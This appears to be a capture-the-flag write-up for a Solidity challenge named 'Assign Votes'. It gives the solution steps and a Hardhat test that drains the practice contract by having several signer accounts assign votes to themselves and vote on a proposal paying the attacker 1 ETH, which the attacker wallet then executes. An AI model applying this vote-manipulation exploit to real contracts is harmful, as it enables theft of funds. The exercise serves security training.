# Assign Votes

## Goals

=> Drain the AssignVotes contract
=> Must exploit one transaction

### Hints

- Business logic errors (and ABI encoding Prerequisite)

### Solution

- Create a Proposal with the attackers address and the desired value (1 ETH in this case) from another account, call the assign function for your own address (not as the attackerWallet since we only have 1 transaction with that account) and call vote on the desired proposal, do that with 10 accounts and just call the execute function with the attackerWallet, so we drained the contract and did only 1 transaction with the attackerWallet

### Attacker Contract

```solidity
contract AssignVotesAttacker {
}
```

### Test

```javascript
it('conduct your attack here', async function () {
	await victimContract.createProposal(attackerWallet.address, '0x', ethers.utils.parseEther('1'));
	console.log(await victimContract.proposals(0));
	let accs = await ethers.getSigners();
	for (let i = 0; i < 11; i++) {
		if (accs[i].address !== attackerWallet.address) {
			await victimContract.connect(accs[i]).assign(accs[i].address);
			await victimContract.connect(accs[i]).vote(0);
		}
	}
	console.log(await victimContract.proposals(0));
	await victimContract.connect(attackerWallet).execute(0);
});
```
